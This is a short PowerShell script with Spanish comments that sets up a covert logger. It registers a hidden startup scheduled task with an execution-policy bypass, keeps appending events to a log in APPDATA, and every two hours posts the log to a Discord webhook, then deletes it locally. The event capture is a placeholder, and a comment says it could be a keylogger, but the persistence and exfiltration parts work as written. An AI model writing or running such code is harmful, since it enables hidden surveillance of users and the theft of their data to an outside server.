# CONFIGURACIÓN INICIAL
$webhookUrl = "https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXXXXXX"
$logFile = "$env:APPDATA\SystemLogs\log.txt"
$lastSendFile = "$env:APPDATA\SystemLogs\lastsend.txt"
$taskName = "SystemLogger"

# CREAR CARPETA DE LOG SI NO EXISTE
$logDir = Split-Path $logFile -Parent
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}

# CREAR TAREA PROGRAMADA PARA INICIO (si no existe)
$task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $task) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Ejecuta logger.ps1 al inicio del sistema" -Force
}

# FUNCIÓN PARA ENVIAR A DISCORD
function Send-ToDiscord {
    param ($content)
    try {
        $body = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
        return $true
    } catch {
        Add-Content -Path $logFile -Value "[$(Get-Date)] ERROR al enviar a Discord: $_"
        return $false
    }
}

# INICIAR LOOP INFINITO
while ($true) {
    # SIMULACIÓN DE CAPTURA DE EVENTO (puede ser keylog, etc.)
    $fakeEvent = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Usuario activo"
    Add-Content -Path $logFile -Value $fakeEvent

    # CADA 2 HORAS ENVÍA
    $now = Get-Date
    $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }

    if (($now - $lastSend).TotalMinutes -ge 120 -and (Test-Path $logFile)) {
        $data = Get-Content $logFile -Raw
        if ($data) {
            if (Send-ToDiscord -content $data) {
                Clear-Content -Path $logFile
                $now.ToString("o") | Out-File -FilePath $lastSendFile -Force
            }
        }
    }

    Start-Sleep -Seconds 60
}
